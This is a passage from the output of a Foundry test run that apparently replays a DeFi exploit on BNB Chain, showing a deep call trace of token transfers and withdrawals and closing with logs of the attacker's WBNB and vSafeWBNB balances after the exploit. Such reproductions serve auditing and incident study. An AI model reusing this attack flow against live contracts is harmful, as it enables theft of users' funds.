    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 11183135848419738934851 [1.118e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 11183135848419738934851 [1.118e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2627] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::totalToken() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1887] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::totalToken() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa900A6291d3A49B1b555b40bd6277D56228B690b) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 11183135848419738934851 [1.118e22]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000025e3d2fb3583b325e43
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000025e3d2fb3583b325e43
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [865] 0xDaC4d0EE7B55497E96b73a53b31A2B47ABb7b5a8::userInfo(0, 0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1467381470142172202460 [1.467e21], 9295580163936736355378 [9.295e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1274] 0xa900A6291d3A49B1b555b40bd6277D56228B690b::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [531] 0x8dB1d72467dc02a0974E52D131736438f3C34D61::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xeDc4050bE30300E366f6A742E9Ee7902e72d5d96) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000004f8c023892f6a385dc
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3050] 0xa8C9357dD25188f5E5954DC25509f92c44F38740::balanceOf() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [873] 0x07dE034A0Fc0DA7a0bf703F6DcA7025bcD61BA3e::userInfo(2, 0xa8C9357dD25188f5E5954DC25509f92c44F38740) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 24228113350502997257692 [2.422e22], 7408868011005831571933 [7.408e21]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xa8C9357dD25188f5E5954DC25509f92c44F38740) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000521689db63c86536ddc
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000000000000000000000000c23c026220e9406f1ca
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD4BBF439d3EAb5155Ca7c0537E583088fB4CFCe8) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, value: 396169639688580127539 [3.961e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x00000000000000000000000000000000000000000000001579f54c4cd0505b33
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 393653746565350521391470 [3.936e23]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [8948] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xd7D069493685A581d27824Fc46EdA46B7EfC0063, 393653746565350521391470 [3.936e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, to: 0xd7D069493685A581d27824Fc46EdA46B7EfC0063, value: 393653746565350521391470 [3.936e23])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Approval(owner: 0xE38EBFE8F314dcaD61d5aDCB29c1A26F41BEd0Be, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [537] 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0::balanceOf(0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xd7D069493685A581d27824Fc46EdA46B7EfC0063, 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4, to: 0xd7D069493685A581d27824Fc46EdA46B7EfC0063, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xd7D069493685A581d27824Fc46EdA46B7EfC0063) [staticcall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 399294373522940234391875 [3.992e23]
    тФВ   тФВ   тФЬтФА [1473] 0x53dbb71303ad0F9AFa184B8f7147F9f12Bb5Dc01::getWrappedNativeAddr() [staticcall]
    тФВ   тФВ   тФВ   тФЬтФА [733] 0xFe16999D88856a9E492cE3088Eaea8Fc9E2a05C4::getWrappedNativeAddr() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
    тФВ   тФВ   тФЬтФА [3407] 0x53dbb71303ad0F9AFa184B8f7147F9f12Bb5Dc01::getWNativeRelayer() [staticcall]
    тФВ   тФВ   тФВ   тФЬтФА [2667] 0xFe16999D88856a9E492cE3088Eaea8Fc9E2a05C4::getWNativeRelayer() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000e1d2ca01bc88f325ff7266dd2165944f3caf0d3d
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000e1d2ca01bc88f325ff7266dd2165944f3caf0d3d
    тФВ   тФВ   тФЬтФА [25162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xE1D2CA01bc88F325fF7266DD2165944f3CAf0D3D, 1001999997438639970 [1.001e18])
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xd7D069493685A581d27824Fc46EdA46B7EfC0063, to: 0xE1D2CA01bc88F325fF7266DD2165944f3CAf0D3D, value: 1001999997438639970 [1.001e18])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФЬтФА [1407] 0x53dbb71303ad0F9AFa184B8f7147F9f12Bb5Dc01::getWNativeRelayer() [staticcall]
    тФВ   тФВ   тФВ   тФЬтФА [667] 0xFe16999D88856a9E492cE3088Eaea8Fc9E2a05C4::getWNativeRelayer() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000e1d2ca01bc88f325ff7266dd2165944f3caf0d3d
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x000000000000000000000000e1d2ca01bc88f325ff7266dd2165944f3caf0d3d
    тФВ   тФВ   тФЬтФА [26820] 0xE1D2CA01bc88F325fF7266DD2165944f3CAf0D3D::withdraw(1001999997438639970 [1.001e18])
    тФВ   тФВ   тФВ   тФЬтФА [9195] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(1001999997438639970 [1.001e18])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [55] 0xE1D2CA01bc88F325fF7266DD2165944f3CAf0D3D::fallback{value: 1001999997438639970}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Withdrawal(src: 0xE1D2CA01bc88F325fF7266DD2165944f3CAf0D3D, wad: 1001999997438639970 [1.001e18])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФЬтФА [671] 0xd7D069493685A581d27824Fc46EdA46B7EfC0063::fallback{value: 1001999997438639970}()
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [55] 0x7EEAA96bf1aBaA206615046c0991E678a2b12Da1::fallback{value: 1001999997438639970}() [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФЬтФА [0] 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233::fallback{value: 1001999997438639970}()
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233) [staticcall]
    тФВ   тФФтФА тЖР [Return] 0
    тФЬтФА emit log_named_decimal_uint(key: "[End] WBNB balance of attacker after exploit", val: 0, decimals: 18)
    тФЬтФА [531] 0xD4BBF439d3EAb5155Ca7c0537E583088fB4CFCe8::balanceOf(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233) [staticcall]
    тФВ   тФФтФА тЖР [Return] 396169639688580127539 [3.961e20]
    тФЬтФА emit log_named_decimal_uint(key: "[End] Attacker vSafeWBNB balance after exploit", val: 396169639688580127539 [3.961e20], decimals: 18)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 333.81ms (18.46ms CPU time)

Ran 2 test suites in 335.59ms (606.54ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
